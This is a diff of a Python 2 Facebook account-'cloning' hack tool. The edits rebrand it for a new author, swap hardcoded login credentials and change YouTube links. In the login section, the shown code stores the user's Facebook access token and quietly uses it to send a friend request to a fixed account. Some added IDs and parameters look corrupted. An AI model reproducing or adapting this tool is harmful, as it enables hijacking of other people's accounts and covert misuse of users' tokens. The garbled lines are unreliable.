@@ -101,10 +101,10 @@ jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")
 
 jalan("   \033[1;93m Welcome to Aahil Creations ")
 
-jalan("\033[1;97m•◈•──────────•◈•\033[1;96mBlacktiger\033[1;96m•◈•──────────•◈•")
+jalan("\033[1;97m•◈•──────────•◈•\033[1;96mSaqibkhan\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "saqib"
+CorrectPassword = "saqib"
 
 
 loop = 'true'
@@ -117,10 +117,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.Youtube.com/UCJQbRf0xpvwaDu1rqgJuA')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.Youtube.com/UCsdJQf0xpvwaDu1rqgJuA')
 
 def login():
 	os.system('clear')
@@ -164,8 +164,8 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwagDurqgJuA')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uidsvgwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;97m[!] There is no internet connection"
@@ -217,7 +217,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Aahil"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update Saqib"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -324,7 +324,7 @@ def pilih_super():
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"
 
-	jalan('                    \033[1;97mAahil start cloning Wait...')
+	jalan('                    \033[1;97mSaqib start cloning Wait...')
 	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
 
 	def main(arg):
